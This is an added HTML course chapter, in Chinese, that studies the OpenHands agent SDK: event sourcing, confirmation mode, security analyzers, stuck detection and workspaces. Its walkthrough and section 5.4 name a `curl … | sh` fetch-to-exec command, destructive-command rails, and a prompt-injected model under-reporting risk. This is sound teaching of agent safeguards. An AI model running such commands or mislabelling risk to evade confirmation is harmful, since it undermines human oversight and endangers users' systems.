@@ -1,0 +1,466 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OpenHands · AI Agent 工程</title>
+<meta name="description" content="研读 OpenHands Software Agent SDK：以只追加事件日志为唯一事实来源，确认模式、纵深防御的风险评估、卡死检测与本地/远程同构的工作区。">
+<link rel="stylesheet" href="assets/css/course.css">
+<script src="assets/js/manifest.js"></script>
+<script defer src="assets/js/course.js"></script>
+<style>
+  .replay { display: grid; grid-template-columns: minmax(0, 1.25fr) minmax(0, 1fr); gap: 14px; }
+  .replay .log { font: 12.5px/1.55 var(--mono); background: var(--surface-2); border-radius: 8px; padding: 10px; min-height: 260px; max-height: 360px; overflow: auto; }
+  .replay .log div { padding: 3px 6px; border-radius: 5px; margin: 2px 0; white-space: pre-wrap; word-break: break-word; }
+  .replay .log .new { background: var(--accent-soft); }
+  .replay .log .pending { outline: 1.5px dashed var(--danger); }
+  .replay .log .hidden { opacity: .45; text-decoration: line-through; }
+  .replay .derived { font-size: 14px; }
+  .replay .derived dt { color: var(--muted); font-size: 12.5px; margin-top: 8px; }
+  .replay .derived dd { margin: 2px 0 0; font-weight: 600; }
+  .replay .btns { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }
+  @media (max-width: 720px) { .replay { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body data-page="case-openhands">
+<article id="content">
+<div class="eyebrow">第六部分 · 名作研读</div>
+<h1>OpenHands：事件流架构与运行时沙箱</h1>
+<p class="lead">OpenHands 是最知名的开源编码 agent 之一。它在 2025 年把 agent 核心整体重写成一个 SDK，核心思想只有一句：<strong>事件日志是唯一的事实来源，其他一切都是它的投影</strong>。读懂这一点，第 4、8、10 章讲的循环、审批、可靠执行会在同一套代码里串起来。</p>
+<div class="meta"><span>约 45 分钟</span><span>前置：第 4、8、10 章</span><span>研读版本：software-agent-sdk @ 5f1430e（2026-11-25）</span></div>
+
+<div class="goals"><b>学完你能</b>
+<ul>
+  <li>说清"事件溯源（event sourcing）式 agent"和"消息列表式 agent"的区别与取舍</li>
+  <li>解释 OpenHands 如何只靠事件日志就推导出"哪些动作还在等确认"</li>
+  <li>看懂它的纵深防御：模型自报风险 + 确定性规则 + 取最坏值 + 失败即收紧</li>
+  <li>把它的卡死检测、运行边界和本地/远程同构设计搬到自己的项目里</li>
+</ul></div>
+
+<h2>1 · 速览</h2>
+<div class="cards">
+  <div class="card"><span class="tag">仓库</span><b>OpenHands/software-agent-sdk</b><small>agent 核心：SDK、工具、Agent Server、工作区。另有 OpenHands/OpenHands（研读时 HEAD 55c7b71）现在是名为 Agent Canvas 的前端控制台。</small></div>
+  <div class="card"><span class="tag">语言 · 许可证</span><b>Python · MIT</b><small>SDK 另提供 TypeScript 客户端与 REST/WebSocket 接口。</small></div>
+  <div class="card"><span class="tag">规模</span><b>约 16 万行 Python</b><small>openhands-sdk 约 9.0 万、agent-server 约 4.4 万、tools 约 2.2 万、workspace 约 0.3 万（含空行与注释）。</small></div>
+  <div class="card"><span class="tag">一句话定位</span><b>生产级编码 agent 的地基</b><small>事件溯源的会话、可插拔的工具与安全分析、本地与远程沙箱同一接口。</small></div>
+</div>
+
+<div class="callout note"><b>先弄清楚读的是哪一份代码</b>
+<p>OpenHands 经历过一次架构换代。2025-11 发布的技术报告《The OpenHands Software Agent SDK》说，这个 SDK 是"对 OpenHands 框架中 agent 组件的完整架构重设计"，并报告 V1 相比 V0 大幅减少了由系统本身导致的失败，事件溯源的开销可以忽略。现在 <code>OpenHands/OpenHands</code> 仓库的 README 把自己定位为 Agent Canvas：一个能运行 OpenHands 自家 agent、也能通过 ACP 接入 Claude Code、Codex、Gemini CLI 等第三方 agent 的控制台；agent 核心在 <code>software-agent-sdk</code>。本章读的是后者。</p></div>
+
+<h2>2 · 为什么读它</h2>
+<p>第 4 章手写的 agent loop，状态就是一个不断变长的 <code>messages</code> 数组。这个设计在 demo 里够用，到了生产环境会遇到一连串问题：进程重启后怎么接着跑？用户审批到一半，"待审批"的状态存在哪？上下文压缩后，被压掉的内容还要不要留着排查问题？远程跑的 agent，前端怎么实时看到它在干什么？</p>
+<p>OpenHands 对这些问题给出了同一个答案：<strong>把发生过的一切记成不可变的事件，只追加、不修改</strong>。给模型的消息、"待确认的动作"、前端看到的界面，全部从事件日志推导出来。这正是第 10 章说的持久执行和第 14 章说的可回放 trace，只不过它把这两件事合成了一件。</p>
+<p>拿它和下一章的 mini-swe-agent 对照着读很有意思。两者都是顶尖的开源编码 agent，却站在设计谱系的两端：一个把可靠性、安全和多端同步做到极致，一个把 agent 本身压到一百多行。</p>
+
+<h2>3 · 架构总览</h2>
+<figure>
+<div class="diagram">
+<svg viewBox="0 0 760 370" width="760" role="img" aria-label="OpenHands SDK 架构总览">
+  <rect class="box" x="230" y="14" width="300" height="44" rx="10"/>
+  <text class="tb" x="380" y="35" text-anchor="middle">调用方</text>
+  <text class="ts" x="380" y="51" text-anchor="middle">Agent Canvas · CLI · 你的程序</text>
+
+  <rect class="box m" x="20" y="92" width="340" height="166" rx="12"/>
+  <text class="tb" x="190" y="114" text-anchor="middle">Conversation（本地 / 远程）</text>
+  <rect class="box a" x="40" y="128" width="300" height="52" rx="8"/>
+  <text class="t" x="190" y="150" text-anchor="middle">EventLog：只追加的事件日志</text>
+  <text class="ts" x="190" y="170" text-anchor="middle">events/event-00012-&lt;id&gt;.json</text>
+  <rect class="box v" x="40" y="192" width="300" height="52" rx="8"/>
+  <text class="t" x="190" y="214" text-anchor="middle">ConversationState</text>
+  <text class="ts" x="190" y="234" text-anchor="middle">执行状态 · 确认策略 → base_state.json</text>
+
+  <rect class="box m" x="400" y="92" width="340" height="166" rx="12"/>
+  <text class="tb" x="570" y="114" text-anchor="middle">Agent.step()</text>
+  <rect class="box g" x="420" y="128" width="145" height="52" rx="8"/>
+  <text class="t" x="492" y="150" text-anchor="middle">View + 压缩器</text>
+  <text class="ts" x="492" y="170" text-anchor="middle">事件 → 消息</text>
+  <rect class="box a" x="580" y="128" width="140" height="52" rx="8"/>
+  <text class="t" x="650" y="150" text-anchor="middle">LLM</text>
+  <text class="ts" x="650" y="170" text-anchor="middle">产出 tool call</text>
+  <rect class="box r" x="420" y="192" width="300" height="52" rx="8"/>
+  <text class="t" x="570" y="214" text-anchor="middle">安全分析器 → 确认策略</text>
+  <text class="ts" x="570" y="234" text-anchor="middle">风险高或未知 → 等待确认</text>
+
+  <rect class="box m" x="20" y="296" width="340" height="56" rx="10"/>
+  <text class="t" x="190" y="319" text-anchor="middle">卡死检测 · Hooks · 迭代与预算上限</text>
+  <text class="ts" x="190" y="338" text-anchor="middle">每一轮循环前后检查</text>
+  <rect class="box b" x="400" y="296" width="150" height="56" rx="10"/>
+  <text class="t" x="475" y="319" text-anchor="middle">工具</text>
+  <text class="ts" x="475" y="338" text-anchor="middle">终端 · 文件编辑器 …</text>
+  <rect class="box w" x="580" y="296" width="160" height="56" rx="10"/>
+  <text class="t" x="660" y="319" text-anchor="middle">Workspace</text>
+  <text class="ts" x="660" y="338" text-anchor="middle">本地 / Agent Server</text>
+
+  <path class="line" d="M330 58 L250 92" marker-end="url(#arr)"/>
+  <path class="line a" d="M360 140 L400 140" marker-end="url(#arr-a)"/>
+  <path class="line g dash" d="M400 230 L360 160" marker-end="url(#arr-g)"/>
+  <text class="ts" x="372" y="268" text-anchor="middle">追加事件</text>
+  <path class="line" d="M190 258 L190 296" marker-end="url(#arr)"/>
+  <path class="line b" d="M475 258 L475 296" marker-end="url(#arr-b)"/>
+  <path class="line b" d="M550 324 L580 324" marker-end="url(#arr-b)" marker-start="url(#arr-b)"/>
+</svg>
+</div>
+<figcaption>图 C2-1 Conversation 持有事件日志和状态快照；Agent 的 <code>step()</code> 读事件、写事件，自身不保存会话状态。</figcaption>
+</figure>
+
+<p>几个核心类和它们所在的位置（链接都指向研读版本）：</p>
+<table>
+<tr><th>组件</th><th>做什么</th><th>源码</th></tr>
+<tr><td><code>Event</code> 及子类</td><td>不可变事件：<code>MessageEvent</code>、<code>ActionEvent</code>、<code>ObservationEvent</code>、<code>UserRejectObservation</code>、<code>AgentErrorEvent</code>、<code>Condensation</code> 等</td><td><a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/base.py#L21" target="_blank" rel="noopener">event/base.py</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/llm_convertible/action.py#L39" target="_blank" rel="noopener">action.py</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/llm_convertible/observation.py#L32" target="_blank" rel="noopener">observation.py</a></td></tr>
+<tr><td><code>EventLog</code></td><td>每个事件一个 JSON 文件，加锁追加，拒绝重复 ID</td><td><a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/event_store.py#L315" target="_blank" rel="noopener">conversation/event_store.py</a></td></tr>
+<tr><td><code>ConversationState</code></td><td>执行状态机、确认策略、安全分析器；快照写入 <code>base_state.json</code></td><td><a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/state.py#L51" target="_blank" rel="noopener">conversation/state.py</a></td></tr>
+<tr><td><code>LocalConversation.run()</code></td><td>主循环：暂停、卡死、Stop hook、确认、迭代与预算上限</td><td><a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/impl/local_conversation.py#L2647" target="_blank" rel="noopener">local_conversation.py</a></td></tr>
+<tr><td><code>Agent.step()</code></td><td>执行待处理动作或调用模型，产出动作事件并判断是否需要确认</td><td><a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/agent/agent.py#L846" target="_blank" rel="noopener">agent/agent.py</a></td></tr>
+<tr><td>安全分析与确认策略</td><td><code>LLMSecurityAnalyzer</code>、<code>PatternSecurityAnalyzer</code>、<code>PolicyRailSecurityAnalyzer</code>、<code>EnsembleSecurityAnalyzer</code>；<code>ConfirmRisky</code> 等</td><td><a href="https://github.com/OpenHands/software-agent-sdk/tree/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/security" target="_blank" rel="noopener">security/</a></td></tr>
+<tr><td><code>Workspace</code></td><td>工厂：传 <code>host</code> 就返回远程工作区，否则本地</td><td><a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/workspace/workspace.py#L12" target="_blank" rel="noopener">workspace/workspace.py</a></td></tr>
+</table>
+
+<h2>4 · 一次请求的旅程</h2>
+<p>用户说"修一下导出功能的 bug"。点"下一步"，看事件如何一条条追加到日志里，执行状态如何随之变化。注意第 5、6 步：模型提出了一个高风险命令，系统停下来等确认。这时"待确认"并没有被单独记在任何地方。</p>
+
+<figure class="anim" data-dim>
+<div class="diagram">
+<svg viewBox="0 0 760 340" width="760" role="img" aria-label="一次请求在 OpenHands 中产生的事件序列">
+  <text class="tb" x="20" y="46">调用方</text>
+  <text class="tb" x="20" y="102">Conversation</text>
+  <text class="tb" x="20" y="158">Agent</text>
+  <text class="tb" x="20" y="214">工作区</text>
+  <rect class="box m" x="120" y="24" width="620" height="40" rx="8"/>
+  <rect class="box m" x="120" y="80" width="620" height="40" rx="8"/>
+  <rect class="box m" x="120" y="136" width="620" height="40" rx="8"/>
+  <rect class="box m" x="120" y="192" width="620" height="40" rx="8"/>
+  <rect class="box a" x="20" y="252" width="720" height="76" rx="10"/>
+  <text class="ta" x="34" y="272">EventLog（磁盘上的 events/ 目录）</text>
+
+  <g data-k="st0"><text class="ts" x="730" y="106" text-anchor="end">状态：IDLE</text></g>
+  <g data-k="st1"><text class="ts" x="730" y="106" text-anchor="end">状态：RUNNING</text></g>
+  <g data-k="st2"><text class="ts" x="730" y="106" text-anchor="end">状态：WAITING_FOR_CONFIRMATION</text></g>
+  <g data-k="st3"><text class="ts" x="730" y="106" text-anchor="end">状态：IDLE（已拒绝）</text></g>
+  <g data-k="st4"><text class="ts" x="730" y="106" text-anchor="end">状态：FINISHED</text></g>
+
+  <g data-k="c0"><rect class="box" x="40" y="282" width="78" height="36" rx="6"/><text class="ts" x="79" y="304" text-anchor="middle">Message</text></g>
+  <g data-k="c1"><rect class="box" x="128" y="282" width="78" height="36" rx="6"/><text class="ts" x="167" y="304" text-anchor="middle">Action·低</text></g>
+  <g data-k="c2"><rect class="box" x="216" y="282" width="78" height="36" rx="6"/><text class="ts" x="255" y="304" text-anchor="middle">安全分析</text></g>
+  <g data-k="c3"><rect class="box" x="304" y="282" width="78" height="36" rx="6"/><text class="ts" x="343" y="304" text-anchor="middle">Observation</text></g>
+  <g data-k="c4"><rect class="box r" x="392" y="282" width="78" height="36" rx="6"/><text class="ts" x="431" y="304" text-anchor="middle">Action·高</text></g>
+  <g data-k="c5"><rect class="box" x="480" y="282" width="78" height="36" rx="6"/><text class="ts" x="519" y="304" text-anchor="middle">安全分析</text></g>
+  <g data-k="c6"><rect class="box w" x="568" y="282" width="78" height="36" rx="6"/><text class="ts" x="607" y="304" text-anchor="middle">Reject</text></g>
+  <g data-k="c7"><rect class="box g" x="656" y="282" width="78" height="36" rx="6"/><text class="ts" x="695" y="304" text-anchor="middle">… Finish</text></g>
+
+  <g data-k="a0"><path class="line a" d="M79 64 L79 252" marker-end="url(#arr-a)"/></g>
+  <g data-k="a1"><path class="line a" d="M167 176 L167 252" marker-end="url(#arr-a)"/><path class="line a" d="M255 176 L255 252" marker-end="url(#arr-a)"/></g>
+  <g data-k="a3"><path class="line b" d="M343 232 L343 252" marker-end="url(#arr-b)"/></g>
+  <g data-k="a4"><path class="line r" d="M431 176 L431 252" marker-end="url(#arr-r)"/><path class="line r" d="M519 176 L519 252" marker-end="url(#arr-r)"/></g>
+  <g data-k="a6"><path class="line b" d="M607 64 L607 252" marker-end="url(#arr-b)"/></g>
+  <g data-k="a7"><path class="line g" d="M695 176 L695 252" marker-end="url(#arr-g)"/></g>
+</svg>
+</div>
+<ol class="anim-steps">
+  <li data-show="st0 c0 a0" data-hl="c0 a0"><code>send_message()</code> 把用户消息包装成 <code>MessageEvent</code>（source = user），经 <code>EventLog.append()</code> 写成 <code>events/event-00000-&lt;id&gt;.json</code>。追加时加文件锁，同一 ID 再写会直接报错。</li>
+  <li data-show="st1" data-hide="st0" data-hl="st1"><code>run()</code> 把状态从 IDLE 切到 RUNNING，进入主循环（<code>local_conversation.py:2692</code>）。每一轮先检查：是否暂停、是否卡死、是否已完成。随后 <code>Agent.step()</code> 用 <code>prepare_llm_messages(state.view, …)</code> 把事件投影成消息发给模型。</li>
+  <li data-show="c1 c2 a1" data-hl="c1 c2 a1">模型返回一个 tool call：在终端里 <code>grep</code> 导出相关代码。它变成 <code>ActionEvent</code>（source = agent），字段里带着模型自报的 <code>security_risk</code>。安全分析器的结论也记成一条 <code>SecurityAnalysisEvent</code>。风险低，<code>ConfirmRisky</code> 不要求确认。</li>
+  <li data-show="c3 a3" data-hl="c3 a3">工具在 Workspace 里执行，结果写成 <code>ObservationEvent</code>（source = environment），用 <code>action_id</code> 指回刚才的动作。动作和观察从此"配对"了。</li>
+  <li data-show="st2 c4 c5 a4" data-hide="st1" data-hl="c4 c5 a4 st2">模型接着提出 <code>curl … | sh</code>。确定性的策略护栏 <code>fetch-to-exec</code> 命中，判为 HIGH；Ensemble 取所有分析器里的最坏值。<code>_set_confirmation_status()</code> 把状态切到 WAITING_FOR_CONFIRMATION，<code>run()</code> 返回。</li>
+  <li data-show="st3 c6 a6" data-hide="st2" data-hl="c4 c6 a6 st3">"待确认的动作"从哪来？<code>get_unmatched_actions()</code> 倒序扫描日志，找出<strong>有 Action、没有对应 Observation、Reject 或 Error</strong> 的那些。用户拒绝后，系统追加一条 <code>UserRejectObservation</code>，这条动作就被"配对"掉了。如果用户批准，下次 <code>run()</code> 时 <code>step()</code> 先执行它。</li>
+  <li data-show="st4 c7 a7" data-hide="st3" data-hl="c7 a7 st4">用户补充指示后继续运行。模型调用 finish，状态变为 FINISHED。如果配置了 Stop hook 且它拒绝停止，系统会把反馈作为一条新消息追加进去，状态回到 RUNNING，继续工作。</li>
+  <li data-hl="c0 c1 c2 c3 c4 c5 c6 c7">假设此刻进程崩溃。重启后，会话从 <code>events/</code> 目录和 <code>base_state.json</code> 恢复；"哪些动作还没执行"不需要单独保存，重新扫一遍日志就能算出来。这就是事件溯源最值钱的地方。</li>
+</ol>
+<figcaption>图 C2-2 一次请求产生的事件序列（示意：真实会话里还会有系统提示、思考内容、状态更新等事件）。</figcaption>
+</figure>
+
+<h2>5 · 关键设计拆解</h2>
+
+<h3>5.1 事件是唯一事实来源，消息只是投影</h3>
+<p><strong>它怎么做</strong>：所有事件都继承 <code>Event</code>，模型配置是 <code>frozen=True</code>，创建后不能修改。每个事件有 <code>id</code>、<code>timestamp</code>、<code>source</code>（只能是 agent、user、environment、hook 四种之一）和 <code>parent_id</code>。能送给模型的那部分事件继承 <code>LLMConvertibleEvent</code>，各自实现 <code>to_llm_message()</code>。<code>events_to_messages()</code> 负责把事件序列转成消息序列，并把同一次模型回复产生的多个 <code>ActionEvent</code> 按 <code>llm_response_id</code> 合并回一条 assistant 消息。它的注释写得很直白：</p>
+<blockquote>This is a read-only projection over the event log: events are immutable once created and appended…</blockquote>
+<p><strong>源码</strong>：<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/base.py#L21" target="_blank" rel="noopener">event/base.py:21</a>（Event）、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/base.py#L108" target="_blank" rel="noopener">:108</a>（events_to_messages）、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/types.py#L7" target="_blank" rel="noopener">event/types.py:7</a>（SourceType）。</p>
+<p><strong>为什么这样设计</strong>：送给模型的消息格式随提供商变化，压缩、合并的策略也在不断迭代。如果把消息列表当作状态，每改一次策略，历史数据就要迁移一次。把不可变的事件当作状态、消息当作视图，策略变了只需要重新投影。<code>source</code> 字段则让"谁说的"成为数据的一部分：工具输出属于 environment，不是 user。第 9 章讲提示注入时说过，区分指令来源正是防御的前提。</p>
+<p><strong>对应章节</strong>：<a href="ch04-agent-loop.html">第 4 章</a>（消息结构）、<a href="ch10-durable-execution.html">第 10 章</a>（持久执行）、<a href="ch14-observability.html">第 14 章</a>（可回放的 trace）。</p>
+
+<h3>5.2 只追加的日志，和"墓碑"式的上下文压缩</h3>
+<p><strong>它怎么做</strong>：<code>EventLog.append()</code> 先拿文件锁（30 秒超时），检查 ID 是否已存在、父事件是否存在，然后把事件写成 <code>event-{idx:05d}-{event_id}.json</code>，并维护一个记录长度的标记文件，以便发现其他进程写入的事件。</p>
+<p>上下文压缩怎么办？只追加的日志不能删东西。OpenHands 的做法是追加一条 <code>Condensation</code> 事件，说明"哪些事件被遗忘、用什么摘要代替"；读取时由 <code>View</code> 应用这些压缩。压缩器的 README 把它比作 Cassandra、Kafka 里的<strong>墓碑</strong>（tombstone），并说明了默认策略：用一条摘要替换前一半事件，后一半保持原样。</p>
+<pre data-title="摘自 openhands-sdk/conversation/persistence_const.py（MIT）"><code class="lang-py">
+BASE_STATE = "base_state.json"
+EVENTS_DIR = "events"
+EVENT_FILE_PATTERN = "event-{idx:05d}-{event_id}.json"
+</code></pre>
+<p><strong>源码</strong>：<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/event_store.py#L315" target="_blank" rel="noopener">conversation/event_store.py:315</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/condenser.py#L11" target="_blank" rel="noopener">event/condenser.py:11</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/context/condenser/README.md" target="_blank" rel="noopener">context/condenser/README.md</a>。</p>
+<p><strong>为什么这样设计</strong>：README 列了四点权衡。定期压缩让每次调用的 token 有上界；压缩会打破提示缓存，但定期做能让重建缓存的代价保持在低位；早期内容以摘要形式保留，摘要还会被再次摘要；后一半不动，agent 能顺畅地继续手上的事。最关键的是，原始事件永远还在磁盘上，排查问题时能看到压缩前的完整历史。</p>
+<p><strong>对应章节</strong>：<a href="ch05-context-engineering.html">第 5 章</a>（压缩与上下文预算）、<a href="ch02-llm-fundamentals.html">第 2 章</a>（提示缓存）。</p>
+
+<h3>5.3 "待确认"不是一个状态字段，而是日志里的一个缺口</h3>
+<p><strong>它怎么做</strong>：确认模式下，模型产出动作后如果需要确认，<code>run()</code> 就停在 WAITING_FOR_CONFIRMATION。待确认的动作由 <code>get_unmatched_actions()</code> 从日志里推出来：</p>
+<pre data-title="摘自 openhands-sdk/conversation/state.py（MIT，节选）"><code class="lang-py">
+for event in reversed(events):
+    if isinstance(event, (ObservationEvent, UserRejectObservation)):
+        observed_action_ids.add(event.action_id)
+    elif isinstance(event, AgentErrorEvent):
+        observed_tool_call_ids.add(event.tool_call_id)
+    elif isinstance(event, ActionEvent):
+        if (
+            event.action is not None
+            and event.id not in observed_action_ids
+            and event.tool_call_id not in observed_tool_call_ids
+        ):
+            unmatched_actions.insert(0, event)
+</code></pre>
+<p>用户批准的方式是再调用一次 <code>run()</code>：<code>Agent._step()</code> 一开头就检查有没有未配对的动作，有就先执行（注释里叫"隐式确认"）。用户拒绝则调用 <code>reject_pending_actions()</code>，为每个待处理动作追加一条 <code>UserRejectObservation</code>，把缺口"补上"。PreToolUse hook 拦下的动作也走同一条路，只是 <code>rejection_source</code> 是 hook 而不是 user。</p>
+<p><strong>源码</strong>：<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/state.py#L890" target="_blank" rel="noopener">conversation/state.py:890</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/agent/agent.py#L859" target="_blank" rel="noopener">agent/agent.py:859</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/impl/local_conversation.py#L3445" target="_blank" rel="noopener">local_conversation.py:3445</a>。</p>
+<p><strong>为什么这样设计</strong>：状态只有一份，就不会出现"状态表说待审批、日志里却已经执行了"的不一致。崩溃恢复也因此变得简单。注意注释里特别提到：<code>AgentErrorEvent</code> 按 <code>tool_call_id</code> 配对，正是为了服务器重启后补发的错误事件也能把动作"配对"掉。</p>
+<p><strong>对应章节</strong>：<a href="ch08-hitl-autonomy.html">第 8 章</a>（提案模式）、<a href="ch10-durable-execution.html">第 10 章</a>（崩溃恢复）。</p>
+
+<div class="callout deep"><b>和第 10 章的提案状态机对比</b>
+<p>第 10 章和跟练项目 P3 的做法是显式状态机：提案表里有 <code>pending → approved → executing → done</code> 字段，外加 outbox 和幂等键。OpenHands 的做法是从事件推导。两者没有绝对优劣：显式状态机查询快、语义直观，适合"提案"本身就是业务对象（要列表、筛选、过期）的场景；事件推导一致性更强，适合 agent 内部的执行状态。一个成熟的系统往往两者都有：业务层用状态机，执行层用事件日志。</p></div>
+
+<h3>5.4 纵深防御的风险评估：自报 + 规则 + 取最坏值 + 失败即收紧</h3>
+<p><strong>它怎么做</strong>：风险评估分三层。</p>
+<ol>
+  <li><strong>模型自报</strong>：工具调用的参数里有一个 <code>security_risk</code> 字段，<code>LLMSecurityAnalyzer</code> 直接采用模型填的值（LOW、MEDIUM、HIGH 或 UNKNOWN）。</li>
+  <li><strong>确定性规则</strong>：<code>PatternSecurityAnalyzer</code> 用正则签名扫描；<code>PolicyRailSecurityAnalyzer</code> 用 tree-sitter 解析 shell，检查"组合起来才危险"的结构。目前有三条护栏：<code>fetch-to-exec</code>（下载后直接执行）、<code>raw-disk-op</code>、<code>catastrophic-delete</code>。它的注释说：<code>curl … | command</code> 危险，是因为"下载 + 管道执行"的组合，而不是因为其中某个词。</li>
+  <li><strong>融合</strong>：<code>EnsembleSecurityAnalyzer</code> 调用所有子分析器，取最高的具体风险；任何一个子分析器抛异常，就按 HIGH 计（fail-closed）。可选的 <code>propagate_unknown</code> 让"任何一个说不知道"就整体判为 UNKNOWN。</li>
+</ol>
+<p>最后由确认策略决定要不要停下来问人：</p>
+<pre data-title="摘自 openhands-sdk/security/confirmation_policy.py（MIT）"><code class="lang-py">
+class ConfirmRisky(ConfirmationPolicyBase):
+    threshold: SecurityRisk = SecurityRisk.HIGH
+    confirm_unknown: bool = True
+
+    def should_confirm(self, risk: SecurityRisk = SecurityRisk.UNKNOWN) -&gt; bool:
+        if risk == SecurityRisk.UNKNOWN:
+            return self.confirm_unknown
+        return risk.is_riskier(self.threshold)
+</code></pre>
+<p><strong>源码</strong>：<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/security/llm_analyzer.py#L10" target="_blank" rel="noopener">security/llm_analyzer.py</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/security/defense_in_depth/policy_rails.py#L53" target="_blank" rel="noopener">defense_in_depth/policy_rails.py:53</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/security/ensemble.py#L22" target="_blank" rel="noopener">security/ensemble.py:22</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/security/confirmation_policy.py#L43" target="_blank" rel="noopener">confirmation_policy.py:43</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/agent/agent.py#L1334" target="_blank" rel="noopener">agent/agent.py:1334</a>。</p>
+<p><strong>为什么这样设计</strong>：模型自报的风险是有用的信号，但一个被注入的模型可以把危险命令标成 LOW。所以确定性规则必须独立存在，融合时取最坏值，未知就当作需要确认，分析器自己坏了就收紧而不是放行。还有一个细节：单独一个 finish、think 或只读的 ask_user 调用永远不要求确认，否则就是"问用户要不要问用户"。</p>
+<p><strong>对应章节</strong>：<a href="ch09-security.html">第 9 章</a>（纵深防御）、<a href="ch08-hitl-autonomy.html">第 8 章</a>（按风险分级确认）。</p>
+
+<h3>5.5 运行边界：卡死检测、迭代上限、预算、Stop hook</h3>
+<p><strong>它怎么做</strong>：<code>StuckDetector</code> 每轮扫描最近 20 个事件，识别五种模式：重复的"动作-观察"循环、重复的"动作-报错"循环、没有用户输入的连续独白、交替重复的模式、上下文窗口错误。默认阈值分别是 4 次、3 次、3 条、6 次。遇到重复报错时，它会先"提醒"一次，再判定为 STUCK。主循环里还有单次运行的最大迭代数和预算上限，超了就转入 ERROR 并追加一条带错误码的 <code>ConversationErrorEvent</code>。</p>
+<p>模型调用 finish 后，主循环不会立刻退出：如果配置了 Stop hook 且它拒绝停止，hook 的反馈会作为一条消息追加，状态回到 RUNNING。这和第 12 章讲的 Claude Code Stop hook 是同一种思路。</p>
+<p><strong>源码</strong>：<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/stuck_detector.py#L27" target="_blank" rel="noopener">conversation/stuck_detector.py:27</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/types.py#L226" target="_blank" rel="noopener">conversation/types.py:226</a>（阈值）、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/impl/local_conversation.py#L2704" target="_blank" rel="noopener">local_conversation.py:2704</a>（Stop hook 与上限）。</p>
+<p><strong>对应章节</strong>：<a href="ch04-agent-loop.html">第 4 章</a>（停止条件）、<a href="ch12-long-running.html">第 12 章</a>（过早宣布完成与 Stop hook）。</p>
+
+<h3>5.6 本地与远程同一接口</h3>
+<p><strong>它怎么做</strong>：<code>Workspace(working_dir=…)</code> 返回 <code>LocalWorkspace</code>；加上 <code>host=…</code> 就返回 <code>RemoteWorkspace</code>，背后是 Agent Server（REST + WebSocket），可以跑在 Docker、VM 或云上。远程会话的 <code>RemoteEventsList</code> 第一次访问时通过 REST 拉取已有事件，之后靠 WebSocket 推送增量追加；状态变化通过 <code>ConversationStateUpdateEvent</code> 推给客户端，不用轮询。</p>
